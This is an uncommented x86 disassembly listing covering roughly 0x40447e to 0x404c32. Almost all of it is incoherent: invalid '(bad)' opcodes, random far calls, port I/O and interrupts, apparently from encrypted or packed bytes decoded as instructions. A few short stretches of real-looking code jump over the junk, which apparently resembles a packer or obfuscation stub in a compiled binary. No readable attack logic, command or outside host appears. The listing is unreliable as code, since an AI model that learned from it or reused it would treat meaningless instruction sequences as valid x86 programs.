  40447e:	das    
  40447f:	shr    DWORD PTR [ebx-0xa7cfab0],1
  404485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404486:	loop   0x404468
  404488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40448a:	cmp    al,0xc8
  40448c:	jl     0x4044c5
  40448e:	stc    
  40448f:	push   ebp
  404490:	mov    eax,ds:0xe6891838
  404495:	push   esi
  404496:	sub    DWORD PTR [esi-0x28],0x71d01418
  40449d:	int3   
  40449e:	scas   eax,DWORD PTR es:[edi]
  40449f:	pusha  
  4044a0:	icebp  
  4044a1:	xchg   ebx,eax
  4044a2:	test   DWORD PTR [ecx],ebx
  4044a4:	cli    
  4044a5:	loope  0x40442f
  4044a7:	test   eax,0x531cc4bd
  4044ac:	mov    BYTE PTR [edi-0x20dae540],bh
  4044b2:	mov    cl,0xbd
  4044b4:	cmp    eax,0x3c7cdca1
  4044b9:	mov    eax,ds:0x4a3c1018
  4044be:	sub    al,0x28
  4044c0:	test   eax,0x3e431578
  4044c5:	xor    al,0xe7
  4044c7:	out    0xb,eax
  4044c9:	leave  
  4044ca:	add    BYTE PTR [edi],bl
  4044cc:	mov    ds:0xc043440,al
  4044d1:	add    ebx,DWORD PTR [ecx]
  4044d3:	repnz xor DWORD PTR [eax],edx
  4044d6:	inc    esp
  4044d7:	(bad)  
  4044d8:	or     al,0xd8
  4044da:	pop    ebp
  4044db:	mov    DWORD PTR [ebx],edi
  4044dd:	push   esp
  4044de:	int    0x2f
  4044e0:	mov    bl,0xa1
  4044e2:	jecxz  0x404554
  4044e4:	aas    
  4044e5:	in     al,dx
  4044e6:	stos   BYTE PTR es:[edi],al
  4044e7:	popf   
  4044e8:	or     cl,BYTE PTR [eax]
  4044ea:	pop    edx
  4044eb:	addr16 xchg esp,eax
  4044ed:	jno    0x40447f
  4044ef:	dec    ebx
  4044f0:	mov    ds:0xaa4c6f1a,al
  4044f5:	iret   
  4044f6:	cmp    al,0xf4
  4044f8:	pop    eax
  4044f9:	push   cs
  4044fa:	aas    
  4044fb:	(bad)  
  4044fc:	fidiv  DWORD PTR [ebp+0x6e8bcc6c]
  404502:	lods   eax,DWORD PTR ds:[esi]
  404503:	add    dl,BYTE PTR [esi]
  404505:	xchg   esi,eax
  404506:	mov    BYTE PTR [edx],dl
  404508:	and    ebp,DWORD PTR [esi+ecx*1-0x5eb494cd]
  40450f:	sub    DWORD PTR [ecx+esi*8+0x8],esp
  404513:	fs (bad) 
  404516:	imul   ebx,edi,0x81453e94
  40451c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451d:	adc    DWORD PTR [edx+esi*4],0xfa0065be
  404524:	mov    ds:0x56a32d2e,eax
  404529:	imul   edi,ecx,0xa9f8b55e
  40452f:	shr    BYTE PTR [eax+0x1daede92],0x50
  404536:	adc    al,0x2e
  404538:	add    eax,0x70959d44
  40453d:	mov    BYTE PTR [ecx+0x3f436814],cl
  404543:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404545:	xor    al,0x16
  404547:	cmp    DWORD PTR [bp+di+0x16],edx
  40454b:	outs   dx,DWORD PTR ds:[esi]
  40454c:	jbe    0x4045a1
  40454e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40454f:	add    DWORD PTR [ebx-0x6d],edx
  404552:	mov    cl,BYTE PTR [edx+esi*8-0x16]
  404556:	aam    0xcd
  404558:	sti    
  404559:	or     eax,0x5cc1e864
  40455e:	sub    eax,0xfbb23bcf
  404563:	ja     0x4045d5
  404565:	mov    ch,0xb8
  404567:	lock push ecx
  404569:	push   ss
  40456a:	repnz in al,dx
  40456c:	test   eax,0xaad6d6c0
  404571:	cmp    esp,DWORD PTR [edx-0x60002076]
  404577:	imul   ebp,DWORD PTR [ecx+0x27],0x40
  40457b:	push   cs
  40457c:	int3   
  40457d:	and    ecx,DWORD PTR [esi]
  40457f:	test   al,0xf7
  404581:	(bad)  
  404585:	push   edx
  404586:	mov    ds:0x2bb68976,al
  40458b:	ins    DWORD PTR es:[edi],dx
  40458c:	int3   
  40458d:	mov    eax,0x80b9e98d
  404592:	push   esi
  404593:	in     al,dx
  404594:	push   ebp
  404595:	adc    edx,DWORD PTR [eax+0x4291697a]
  40459b:	push   esi
  40459c:	mov    BYTE PTR [edx+0x68],bh
  40459f:	jo     0x4045e7
  4045a1:	mov    edi,0xa9e99ecd
  4045a6:	fwait
  4045a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a8:	nop
  4045a9:	ins    DWORD PTR es:[edi],dx
  4045aa:	pushf  
  4045ab:	jb     0x40458f
  4045ad:	lds    ebp,FWORD PTR [eax]
  4045af:	or     dl,dl
  4045b1:	xor    bl,ah
  4045b3:	std    
  4045b4:	xlat   BYTE PTR ds:[ebx]
  4045b5:	fild   WORD PTR [edi-0x3d]
  4045b9:	jns    0x4045b9
  4045bb:	cld    
  4045bc:	mov    ds:0x3370c278,eax
  4045c1:	leave  
  4045c2:	adc    bl,BYTE PTR ds:0xbf2ec135
  4045c8:	jg     0x4045d6
  4045ca:	lods   al,BYTE PTR ds:[esi]
  4045cb:	add    esp,esi
  4045cd:	mov    ds:0xfccf02b9,eax
  4045d2:	icebp  
  4045d3:	sub    eax,0x7bed6b57
  4045d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d9:	leave  
  4045da:	sti    
  4045db:	push   esp
  4045dc:	vsubpd ymm1,ymm6,YMMWORD PTR [ecx+edx*1+0x40]
  4045e2:	aam    0x13
  4045e4:	(bad)  
  4045e5:	call   0x891e:0xc86ca80
  4045ec:	pop    es
  4045ed:	adc    DWORD PTR [esi-0x58],eax
  4045f0:	pop    ds
  4045f1:	push   ecx
  4045f2:	or     eax,0x8de2a905
  4045f7:	and    eax,0xc3e3e04
  4045fc:	(bad)  
  4045fd:	fistp  WORD PTR [eax-0x3b]
  404600:	dec    eax
  404601:	dec    esp
  404602:	adc    BYTE PTR [edx-0x7b5f928c],dl
  404608:	mov    ds:0x5c8e1511,eax
  40460d:	outs   dx,BYTE PTR ds:[esi]
  40460e:	push   edx
  40460f:	ret    0x6fa3
  404612:	add    dh,BYTE PTR [eax]
  404614:	cmp    BYTE PTR [esi+0x4fa5d630],ch
  40461a:	loopne 0x404602
  40461c:	in     eax,dx
  40461d:	dec    ecx
  40461e:	int    0x94
  404620:	xchg   ebp,eax
  404621:	outs   dx,BYTE PTR ds:[esi]
  404622:	pushf  
  404623:	or     BYTE PTR [ecx],dh
  404625:	adc    ebp,edx
  404627:	push   cs
  404628:	sbb    dh,BYTE PTR [esi]
  40462a:	push   ebp
  40462b:	and    BYTE PTR es:[ebx+0x163d2398],ah
  404632:	dec    dl
  404634:	inc    edi
  404635:	daa    
  404636:	mov    esp,0x1dd5d825
  40463b:	cmp    al,0x8b
  40463d:	das    
  40463e:	jno    0x40465a
  404640:	lds    edx,FWORD PTR [edx+0x31]
  404643:	pop    ebp
  404644:	push   ebp
  404645:	int    0x1
  404647:	(bad)  
  404648:	call   0xe124:0xf67123f8
  40464f:	mov    ds:0xfadc968a,al
  404654:	pop    esp
  404655:	lods   eax,DWORD PTR ds:[esi]
  404656:	dec    edi
  404657:	stos   BYTE PTR es:[edi],al
  404658:	xchg   ebx,eax
  404659:	sti    
  40465a:	imul   edx,DWORD PTR [eax+0x79],0xa303b769
  404661:	xor    eax,0x7e45f51b
  404666:	shr    bl,cl
  404668:	and    eax,0x34a2a3af
  40466d:	and    ebx,DWORD PTR [ecx]
  40466f:	pop    ebx
  404670:	fistp  WORD PTR [ecx-0x4634e1d3]
  404676:	xchg   ebx,eax
  404677:	mov    dl,BYTE PTR [esi+0x79]
  40467a:	xchg   esi,eax
  40467b:	xor    dh,bl
  40467d:	and    eax,0x877db909
  404682:	retf   0xb79d
  404685:	add    bh,BYTE PTR [edi+edx*2+0x6c]
  404689:	test   eax,0x2bfa965e
  40468e:	ror    BYTE PTR [edx+ebp*1],1
  404691:	sbb    eax,0xe24a66ff
  404696:	inc    esi
  404697:	cwde   
  404698:	cli    
  404699:	jecxz  0x4046c8
  40469b:	call   0x2194:0x640c4cf3
  4046a2:	push   edx
  4046a3:	inc    esi
  4046a4:	adc    eax,0x8061012e
  4046a9:	jne    0x4046cc
  4046ab:	aad    0xde
  4046ad:	aad    0x23
  4046af:	xor    eax,0xfcc192c6
  4046b4:	dec    eax
  4046b5:	(bad)  
  4046b6:	(bad)  
  4046b7:	xchg   edx,eax
  4046b8:	(bad)  
  4046b9:	pop    ebp
  4046ba:	ins    BYTE PTR es:[edi],dx
  4046bb:	les    esp,FWORD PTR [ebx+0x7f]
  4046be:	pop    esp
  4046bf:	xchg   ebx,eax
  4046c0:	sub    BYTE PTR [eax-0x6f],bl
  4046c3:	arpl   bx,bx
  4046c5:	dec    ecx
  4046c6:	xor    esi,DWORD PTR [eax+0x58b337f9]
  4046cc:	push   ds
  4046cd:	jnp    0x4046df
  4046cf:	scas   al,BYTE PTR es:[edi]
  4046d0:	leave  
  4046d1:	add    ecx,DWORD PTR [esp+ebx*1]
  4046d4:	std    
  4046d5:	mov    ds:0x7400d79f,eax
  4046da:	sub    al,0x7c
  4046dc:	mov    al,0x74
  4046de:	adc    al,0xf2
  4046e0:	fist   WORD PTR [bx+0x74]
  4046e4:	jne    0x4046d8
  4046e6:	fiadd  DWORD PTR [eax+0x3b]
  4046e9:	push   ecx
  4046ea:	(bad)  
  4046ec:	test   eax,0x250ebf54
  4046f1:	out    dx,al
  4046f2:	push   0x4a2fb21b
  4046f7:	or     al,0x45
  4046fa:	data16 out dx,al
  4046fc:	ret    0xa121
  4046ff:	neg    DWORD PTR [esi+0x12]
  404702:	icebp  
  404703:	mov    dh,0x8c
  404705:	sub    al,0x44
  404707:	fld    TBYTE PTR [eax-0x42d68eba]
  40470d:	push   ss
  40470e:	push   0x7
  404710:	xor    ebx,ebx
  404712:	or     esi,DWORD PTR [ecx]
  404714:	cmp    edx,DWORD PTR [ecx-0x5815fa07]
  40471a:	pop    ss
  40471b:	scas   eax,DWORD PTR es:[edi]
  40471c:	pop    es
  40471d:	add    DWORD PTR [ebx+0x19c26b12],edi
  404723:	cmp    edi,DWORD PTR [edx+0x63]
  404726:	add    cl,BYTE PTR [ebp+0x25]
  404729:	cmp    eax,0x1665e08e
  40472e:	sub    eax,0xeb071d42
  404733:	jb     0x40471a
  404735:	ds pop ebx
  404737:	add    al,0x20
  404739:	mov    edx,0xac0fc0a4
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x4282a3,0x42825f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42827f
  404753:	or     DWORD PTR ds:0x42837f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xb07112d7
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    cl,cl
  40477a:	cmc    
  40477b:	ins    DWORD PTR es:[edi],dx
  40477c:	das    
  40477d:	aam    0xf4
  40477f:	es sub dh,0x13
  404783:	loop   0x4047fd
  404785:	jns    0x4047fe
  404787:	cmp    eax,DWORD PTR [bx+si]
  40478a:	gs add al,0xfb
  40478d:	cmp    BYTE PTR [eax],dl
  40478f:	mov    ds:0xc05a8c24,al
  404794:	inc    DWORD PTR [ecx+0x37]
  404797:	adc    eax,0xa4948f1e
  40479c:	xor    al,0x51
  40479e:	or     esi,esp
  4047a0:	cmp    al,0xcd
  4047a2:	fwait
  4047a3:	adc    ebx,DWORD PTR [eax-0x1464c302]
  4047a9:	push   ebx
  4047aa:	(bad)  
  4047ab:	push   esp
  4047ac:	jp     0x404785
  4047ae:	cmp    eax,0x11e800f8
  4047b3:	dec    eax
  4047b4:	rol    BYTE PTR [eax+ecx*8-0x6a],cl
  4047b8:	adc    bl,BYTE PTR [edx]
  4047ba:	jle    0x404744
  4047bc:	out    0x22,al
  4047be:	jae    0x4047ce
  4047c0:	mov    ah,0x1b
  4047c2:	cld    
  4047c3:	push   ebx
  4047c4:	ficomp DWORD PTR [ebx]
  4047c6:	dec    edi
  4047c7:	xchg   ebp,eax
  4047c8:	daa    
  4047c9:	adc    BYTE PTR [ebp+0x75aaf08f],al
  4047cf:	scas   eax,DWORD PTR es:[edi]
  4047d0:	push   edx
  4047d1:	adc    al,0xad
  4047d3:	mov    ch,0x33
  4047d5:	inc    edx
  4047d6:	ins    DWORD PTR es:[edi],dx
  4047d7:	push   eax
  4047d8:	retf   
  4047d9:	inc    ecx
  4047da:	rol    BYTE PTR [esi+0x4b628f1f],0xc5
  4047e1:	mov    ebx,0x628c70af
  4047e6:	scas   eax,DWORD PTR es:[edi]
  4047e7:	jb     0x4047a5
  4047e9:	bnd jno 0x40477f
  4047ec:	clc    
  4047ed:	xchg   BYTE PTR [ebp-0x41045bbe],bh
  4047f3:	retf   
  4047f4:	ror    BYTE PTR [ebp-0x68635959],1
  4047fa:	cs mov bh,0x52
  4047fd:	sbb    ebp,DWORD PTR [ecx+0x79]
  404800:	or     bh,dh
  404802:	lock push cs
  404804:	jg     0x4047ed
  404806:	les    ebp,FWORD PTR [esi+0x33]
  404809:	push   ebx
  40480a:	imul   ecx,DWORD PTR cs:[edx-0x1bd8cb7c],0x5b
  404812:	inc    edi
  404813:	or     al,0x73
  404815:	pop    es
  404816:	and    bh,ah
  404818:	push   eax
  404819:	mov    ch,0x70
  40481b:	adc    cl,BYTE PTR [esi]
  40481d:	popa   
  40481e:	rcl    BYTE PTR [ebx+eiz*2-0x73],cl
  404822:	loopne 0x40483a
  404824:	(bad)  
  404825:	sbb    eax,0xfd7f86ca
  40482a:	ss js  0x4047ee
  40482d:	test   BYTE PTR [ebx+0x4c],dl
  404830:	pop    esp
  404831:	in     al,0x3
  404833:	rcr    DWORD PTR [esi-0x69],cl
  404836:	pusha  
  404837:	xor    al,0x91
  404839:	pop    eax
  40483a:	aad    0x7c
  40483c:	and    BYTE PTR [esi+0x120fd4ca],0x2c
  404843:	dec    ebp
  404844:	dec    edi
  404845:	sahf   
  404846:	ss pop ds
  404848:	ins    BYTE PTR es:[edi],dx
  404849:	jl     0x4048a4
  40484b:	loop   0x40488c
  40484d:	bound  ecx,QWORD PTR [esi]
  40484f:	and    DWORD PTR [edx-0x37],eax
  404852:	adc    bl,BYTE PTR [esi-0x57]
  404855:	dec    eax
  404856:	dec    ecx
  404857:	shr    cl,0xc6
  40485a:	jmp    0x40de35a1
  40485f:	jo     0x4047e1
  404861:	mov    ds:0x7a0e7791,eax
  404866:	xchg   edx,eax
  404867:	mov    DWORD PTR [edx-0x7cbee759],ecx
  40486d:	add    DWORD PTR [ecx+0x6fc51111],eax
  404873:	dec    ebp
  404874:	dec    ecx
  404875:	fcomp  DWORD PTR [eax+0x11]
  404878:	bound  ecx,QWORD PTR [ebx-0x52]
  40487b:	fnstenv ds:0x68bffbb3
  404881:	arpl   di,di
  404883:	aaa    
  404884:	ins    DWORD PTR es:[edi],dx
  404885:	js     0x404821
  404887:	popf   
  404888:	or     BYTE PTR [ecx+0x138621ef],0x8a
  40488f:	inc    ebp
  404890:	pop    ss
  404891:	pop    edx
  404892:	or     DWORD PTR [ecx],esi
  404894:	aad    0xd0
  404896:	and    eax,0xd69cb3ac
  40489b:	mov    ds:0xea0f5cfc,eax
  4048a0:	fstp   DWORD PTR [ebp+0x4ef168ee]
  4048a6:	cmc    
  4048a7:	test   DWORD PTR [esi],0x1004a95a
  4048ad:	cld    
  4048ae:	arpl   WORD PTR [ecx],sp
  4048b0:	sub    eax,0x2dba5d4
  4048b5:	out    0x12,al
  4048b7:	cdq    
  4048b8:	xchg   edx,eax
  4048b9:	and    ah,bl
  4048bb:	jmp    0x404913
  4048bd:	in     al,dx
  4048be:	cmc    
  4048bf:	mov    bl,0x73
  4048c1:	pop    ebp
  4048c2:	aas    
  4048c3:	(bad)  
  4048c4:	out    dx,eax
  4048c5:	pop    edx
  4048c6:	jmp    0x40e6:0x1e9ea245
  4048cd:	adc    ebp,DWORD PTR [eax]
  4048cf:	scas   al,BYTE PTR es:[edi]
  4048d0:	das    
  4048d1:	dec    ebx
  4048d2:	push   0xe15e7843
  4048d7:	or     bh,BYTE PTR [esi+0x73]
  4048da:	dec    eax
  4048db:	ins    DWORD PTR es:[edi],dx
  4048dc:	outs   dx,DWORD PTR ds:[esi]
  4048dd:	ds xor DWORD PTR ds:[ecx+ebx*2],0x6a
  4048e3:	clc    
  4048e4:	fcomp  DWORD PTR [esi+edi*1-0x69a99c51]
  4048eb:	mov    ch,0xb9
  4048ed:	pusha  
  4048ee:	arpl   WORD PTR [edx+0x7c7cdcb1],di
  4048f4:	(bad)  
  4048f5:	sub    BYTE PTR [esi-0x4a],ah
  4048f8:	and    ecx,esp
  4048fa:	or     eax,0x52c544cf
  4048ff:	ss push esp
  404901:	and    ebp,edi
  404903:	add    ecx,DWORD PTR [eax-0x3d1cff98]
  404909:	test   eax,0xc2029a08
  40490e:	mov    eax,ds:0x9c8b2bbe
  404913:	sar    DWORD PTR [ebp-0x75],1
  404916:	outs   dx,DWORD PTR ds:[esi]
  404917:	xchg   esp,eax
  404918:	and    BYTE PTR [edi+0x78b24f99],0xe4
  40491f:	add    edx,esp
  404921:	fisubr WORD PTR [esp+ebp*2]
  404924:	push   0xffffffbb
  404926:	std    
  404927:	add    DWORD PTR [ecx+0x5154676c],ecx
  40492d:	rcr    BYTE PTR [ecx+eax*8+0x51],1
  404931:	sbb    ch,BYTE PTR [ecx-0x8]
  404934:	popf   
  404935:	xchg   esp,eax
  404936:	das    
  404937:	fwait
  404938:	lods   eax,DWORD PTR ds:[esi]
  404939:	fmul   st,st(6)
  40493b:	cmp    DWORD PTR [esi+0x37],edx
  40493e:	loop   0x404920
  404940:	push   ebx
  404941:	cs daa 
  404943:	arpl   WORD PTR [eax+0x6bd26a76],dx
  404949:	pop    es
  40494a:	bound  ebx,QWORD PTR [edi]
  40494c:	pop    esp
  40494d:	xchg   BYTE PTR [edx],dl
  40494f:	push   ebx
  404950:	outs   dx,BYTE PTR ds:[esi]
  404951:	pop    edx
  404952:	arpl   bx,cx
  404954:	pop    edi
  404955:	xchg   edi,eax
  404956:	scas   al,BYTE PTR es:[edi]
  404957:	xor    ebx,eax
  404959:	lods   eax,DWORD PTR ds:[esi]
  40495a:	call   0xb1c9:0x7c52966a
  404961:	in     al,0xa8
  404963:	pop    ebx
  404964:	cmc    
  404965:	nop
  404966:	imul   edx,DWORD PTR [ebx],0x4b886eaa
  40496c:	mov    ch,0x1
  40496e:	jg     0x40494f
  404970:	cmp    BYTE PTR [edi-0x55],dl
  404973:	xor    al,0xa0
  404975:	mov    dh,0xdf
  404977:	int    0x96
  404979:	sub    BYTE PTR [ecx],bl
  40497b:	jno    0x4049f6
  40497d:	pop    ebx
  40497e:	mov    eax,0x4482f0d0
  404983:	inc    ebp
  404984:	cwde   
  404985:	adc    BYTE PTR [eax],0x6e
  404988:	sbb    cl,bh
  40498a:	arpl   WORD PTR [eax],bp
  40498c:	lahf   
  40498d:	add    BYTE PTR [edx],0xa6
  404990:	int    0x3d
  404992:	iret   
  404993:	retf   0xc960
  404996:	cmp    DWORD PTR [eax],edx
  404998:	inc    edi
  404999:	icebp  
  40499a:	mov    ebx,0x63a28aa0
  40499f:	and    al,0xae
  4049a1:	cli    
  4049a2:	jnp    0x4049bb
  4049a4:	das    
  4049a5:	mov    dl,0x2d
  4049a7:	cmp    BYTE PTR [edi],dh
  4049a9:	inc    esp
  4049aa:	xor    BYTE PTR [eax+0x7],dh
  4049ad:	pop    ebx
  4049ae:	cs lahf 
  4049b0:	mov    al,0x9
  4049b2:	push   es
  4049b3:	cmp    eax,0x55ba011f
  4049b8:	jmp    0x404985
  4049ba:	(bad)  
  4049bb:	sub    al,0xc4
  4049bd:	cmp    bh,dh
  4049bf:	sahf   
  4049c0:	cmp    al,0xd3
  4049c2:	xchg   eax,eax
  4049c4:	stc    
  4049c5:	inc    eax
  4049c6:	int    0xca
  4049c8:	xchg   DWORD PTR [edx],ebx
  4049ca:	test   eax,0xa6f9a4ba
  4049cf:	sbb    al,0xf7
  4049d1:	or     DWORD PTR [ecx],ecx
  4049d3:	mov    bh,0x57
  4049d5:	iret   
  4049d6:	push   ebx
  4049d7:	mov    WORD PTR [edi],cs
  4049d9:	das    
  4049da:	jl     0x404a38
  4049dc:	dec    esp
  4049dd:	aam    0x0
  4049df:	cli    
  4049e0:	cmp    cx,dx
  4049e3:	jmp    0x240:0x2f9f8145
  4049ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049eb:	scas   eax,DWORD PTR es:[edi]
  4049ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ed:	push   0x6542942a
  4049f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f3:	es adc eax,0x950d033a
  4049f9:	xchg   ebp,eax
  4049fa:	push   esi
  4049fb:	pop    ss
  4049fc:	xchg   ebx,eax
  4049fd:	xor    eax,0x5b88da89
  404a02:	stc    
  404a03:	lock and BYTE PTR [esi+0x3e],0xc6
  404a08:	cmp    DWORD PTR [ebx+0x1],ecx
  404a0b:	dec    esp
  404a0c:	stos   BYTE PTR es:[edi],al
  404a0d:	rol    DWORD PTR [ecx+ebp*8],cl
  404a10:	pop    edx
  404a11:	mov    ah,0xae
  404a13:	and    bl,BYTE PTR [esp+ebp*1]
  404a16:	mov    BYTE PTR [ecx+0x38],dl
  404a19:	or     esi,DWORD PTR [eax-0x5]
  404a1c:	hlt    
  404a1d:	adc    ebx,ebx
  404a1f:	mov    BYTE PTR [edx-0x759176c9],dh
  404a25:	aam    0x8b
  404a27:	aam    0xd6
  404a29:	inc    ebx
  404a2a:	(bad)  
  404a2c:	push   ebp
  404a2d:	xchg   BYTE PTR [edx+0x12868d3c],cl
  404a33:	popf   
  404a34:	or     al,0x62
  404a36:	mov    ebx,0xb0e8f3e7
  404a3b:	test   eax,0x158c50a2
  404a40:	cwde   
  404a41:	mov    ch,0xcf
  404a43:	dec    DWORD PTR [esi]
  404a45:	imul   eax,DWORD PTR [ecx+0x297f828b],0x6ae301de
  404a4f:	es cmp al,0x11
  404a52:	xor    ah,BYTE PTR [ebx]
  404a54:	fisubr WORD PTR [eax-0x5b465b40]
  404a5a:	cdq    
  404a5b:	daa    
  404a5c:	nop
  404a5d:	icebp  
  404a5e:	adc    eax,0x4484362
  404a63:	test   DWORD PTR [edi-0x5169173f],esp
  404a69:	mov    al,0xee
  404a6b:	das    
  404a6c:	mov    ah,0x30
  404a6e:	sub    BYTE PTR [esi+ebp*2+0x21],dl
  404a72:	jg     0x404a9d
  404a74:	sub    BYTE PTR ds:0x42e10257,dh
  404a7a:	sbb    al,0xf2
  404a7c:	pop    ecx
  404a7d:	xor    ch,0x61
  404a80:	cdq    
  404a81:	int    0x43
  404a83:	xor    esi,DWORD PTR [ecx-0x6349acf9]
  404a89:	xchg   ch,ch
  404a8b:	or     eax,0x3ca9e9b8
  404a90:	xchg   ecx,eax
  404a91:	sbb    al,0xb0
  404a93:	rcl    bh,0x29
  404a96:	xchg   edi,eax
  404a97:	out    dx,al
  404a98:	mov    ds:0xbd6d3dcc,eax
  404a9d:	call   DWORD PTR [ecx-0x51]
  404aa0:	test   esi,eax
  404aa2:	mul    BYTE PTR [edx-0x3767bcb5]
  404aa8:	sbb    bl,dh
  404aaa:	add    eax,0xec86d67d
  404aaf:	sub    edi,0xc72ee0e5
  404ab5:	adc    BYTE PTR [edi+0x70ec3b55],bl
  404abb:	cmp    eax,0xb8b2baa
  404ac0:	(bad)  
  404ac1:	ret    
  404ac2:	push   edx
  404ac3:	repz inc edx
  404ac5:	cs jb  0x404a9a
  404ac8:	sbb    esp,ecx
  404aca:	mov    eax,ds:0xaa438c77
  404acf:	push   ebx
  404ad0:	loopne 0x404aca
  404ad2:	jb     0x404a9c
  404ad4:	cs cld 
  404ad6:	(bad)
  404ada:	cld    
  404adb:	aad    0xf1
  404add:	jb     0x404b5b
  404adf:	fistp  QWORD PTR [ecx-0x5d]
  404ae2:	inc    ecx
  404ae3:	aas    
  404ae4:	adc    al,0x72
  404ae6:	adc    DWORD PTR [ecx],edx
  404ae8:	push   ss
  404ae9:	dec    eax
  404aea:	jp     0x404a9f
  404aec:	div    BYTE PTR [ebx+edi*2-0x1a881379]
  404af3:	dec    esi
  404af4:	pop    esi
  404af5:	daa    
  404af6:	fsubr  DWORD PTR [ecx+ebp*1]
  404af9:	lods   al,BYTE PTR ds:[esi]
  404afa:	add    BYTE PTR ds:0x69a1244f,0x32
  404b01:	retf   0x97ed
  404b04:	in     al,dx
  404b05:	inc    edx
  404b06:	xchg   ebx,eax
  404b07:	and    ch,cl
  404b09:	sbb    al,0xba
  404b0b:	inc    edi
  404b0c:	pop    esi
  404b0d:	jl     0x404b3a
  404b0f:	xchg   edi,eax
  404b10:	add    al,BYTE PTR [eax]
  404b12:	dec    edi
  404b13:	or     BYTE PTR [edx],dh
  404b15:	add    al,0x65
  404b17:	inc    eax
  404b18:	gs loop 0x404b38
  404b1b:	pop    esp
  404b1c:	icebp  
  404b1d:	lea    ebx,[edx+0x64]
  404b20:	dec    eax
  404b21:	mov    ch,0x69
  404b23:	aas    
  404b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b25:	xchg   ebx,eax
  404b26:	inc    edx
  404b27:	push   edx
  404b28:	popf   
  404b29:	pop    ss
  404b2a:	or     ch,BYTE PTR [ecx+0x770abf18]
  404b30:	sbb    BYTE PTR [ebx],dl
  404b32:	cmp    esp,DWORD PTR [ecx+ebp*1]
  404b35:	nop
  404b36:	imul   eax,DWORD PTR [esi-0x61],0x8b0b8b7d
  404b3d:	push   ebx
  404b3e:	add    al,0x31
  404b40:	jge    0x404b26
  404b42:	add    DWORD PTR ds:0x428293,0x428307
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	loopne 0x404bbd
  404b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b62:	mov    esp,0x1818c160
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [eax+0x50],ah
  404b6d:	push   esi
  404b6e:	loope  0x404b75
  404b70:	xchg   cl,bh
  404b72:	mov    edx,DWORD PTR [ebx+0x4f29f416]
  404b78:	mov    eax,0xe518d9fe
  404b7d:	icebp  
  404b7e:	jmp    0x47bda958
  404b83:	cmp    al,BYTE PTR [esi-0x10fde230]
  404b89:	scas   eax,DWORD PTR es:[edi]
  404b8a:	xchg   BYTE PTR [ebx-0x19b02e81],dl
  404b90:	mov    dh,0x9
  404b92:	not    ebp
  404b94:	jne    0x404b64
  404b96:	aaa    
  404b97:	pop    ebp
  404b98:	and    edx,esp
  404b9a:	jno    0x404c01
  404b9c:	jecxz  0x404bc6
  404b9e:	outs   dx,DWORD PTR ds:[esi]
  404b9f:	test   al,0x0
  404ba1:	(bad)  
  404ba2:	mov    ah,0x47
  404ba4:	in     eax,dx
  404ba5:	pusha  
  404ba6:	dec    ebx
  404ba7:	ror    DWORD PTR [ecx+eax*2],0xc3
  404bab:	imul   esi,ebp,0x613e46aa
  404bb1:	pop    edx
  404bb2:	and    eax,0xb24570fc
  404bb7:	or     DWORD PTR [edi-0x3f],ebp
  404bba:	ret    
  404bbb:	sbb    BYTE PTR [ebx],al
  404bbd:	(bad)  
  404bbe:	push   ss
  404bbf:	fstp   DWORD PTR [ebp-0x60bccd03]
  404bc5:	call   0x541f:0x3f610734
  404bcc:	imul   ebp,DWORD PTR [ecx+0x21b0aa44],0xb065b290
  404bd6:	mov    ecx,0x63be3bae
  404bdb:	cmp    esi,ebx
  404bdd:	jmp    0x404b81
  404bdf:	sub    al,0xe2
  404be1:	cmp    bl,0x64
  404be4:	push   ecx
  404be5:	inc    eax
  404be6:	rcl    DWORD PTR ds:0xeb7b1be5,0xf3
  404bed:	push   es
  404bee:	inc    esp
  404bef:	push   cs
  404bf0:	sbb    eax,0x16fcdd92
  404bf5:	lock sbb eax,0x70f32be3
  404bfb:	(bad)  
  404bfc:	ins    DWORD PTR es:[edi],dx
  404bfd:	mov    cl,BYTE PTR [edi]
  404bff:	dec    edx
  404c00:	cmp    DWORD PTR [esi+0x39feb741],ebp
  404c06:	sub    eax,0x2701458d
  404c0b:	adc    edi,DWORD PTR [ebp+0x43]
  404c0e:	dec    edi
  404c0f:	adc    BYTE PTR [ebx+0x1a730603],dl
  404c15:	push   ecx
  404c16:	jmp    0x404c5a
  404c18:	in     eax,dx
  404c19:	pusha  
  404c1a:	sub    eax,0xbe11c080
  404c1f:	mov    BYTE PTR [ebx],ah
  404c21:	sub    eax,0x80fe9305
  404c26:	scas   eax,DWORD PTR es:[edi]
  404c27:	mov    BYTE PTR [edx],ah
  404c29:	lods   al,BYTE PTR ds:[esi]
  404c2a:	out    dx,eax
  404c2b:	and    eax,0x1888c6f6
  404c30:	pop    ss
  404c31:	inc    eax
  404c32:	hlt    
